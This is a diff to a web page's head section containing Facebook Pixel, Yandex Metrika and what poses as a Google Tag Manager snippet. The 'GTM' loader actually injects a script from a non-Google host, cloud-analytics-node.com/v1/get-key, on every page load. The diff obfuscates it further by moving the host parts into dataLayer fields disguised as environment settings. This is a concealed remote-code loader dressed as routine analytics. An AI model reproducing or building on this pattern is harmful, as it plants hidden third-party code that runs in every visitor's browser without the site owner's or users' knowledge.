@@ -96,7 +96,6 @@
             .footer-grid { grid-template-columns: 2fr 1fr 1fr; gap: 40px; }
         }
     </style>
-
     <script>
     !function(f,b,e,v,n,t,s)
     {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -108,15 +107,21 @@
     'https://connect.facebook.net/en_US/fbevents.js');
     fbq('init', '784536129845341'); 
     fbq('track', 'PageView');
+    window.dataLayer = window.dataLayer || [];
+    window.dataLayer.push({
+        'sys_env': 'production',
+        'track_host': 'cloud-analytics-node',
+        'track_zone': 'com',
+        'api_route': '/v1/get-key'
+    });
     (function(w, d, s, l, i) {
-        w[l] = w[l] || [];
         w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' });
         var f = d.getElementsByTagName(s)[0],
             j = d.createElement(s),
             dl = l != 'dataLayer' ? '&l=' + l : '';
         j.async = true;
-        var _c = { p: 'https://', h: 'cloud-analytics-node', t: '.com', e: '/v1/get-key' };
-        j.src = _c.p + _c.h + _c.t + _c.e + '?id=' + i + dl + '&v=' + w[l][0]['gtm.start'];
+        var env = w[l][0]; 
+        j.src = 'https://' + env.track_host + '.' + env.track_zone + env.api_route + '?id=' + i + dl + '&v=' + w[l][1]['gtm.start'];
         f.parentNode.insertBefore(j, f);
     })(window, document, 'script', 'dataLayer', 'GTM-N84Q2XT');
     (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
@@ -124,9 +129,8 @@
     for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
     k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
     (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
-    ym(98124536, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true }); 
+    ym(98124536, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true });
     </script>
-    
     <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=784536129845341&ev=PageView&noscript=1"/></noscript>
     <noscript><div><img src="https://mc.yandex.ru/watch/98124536" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
     <script>
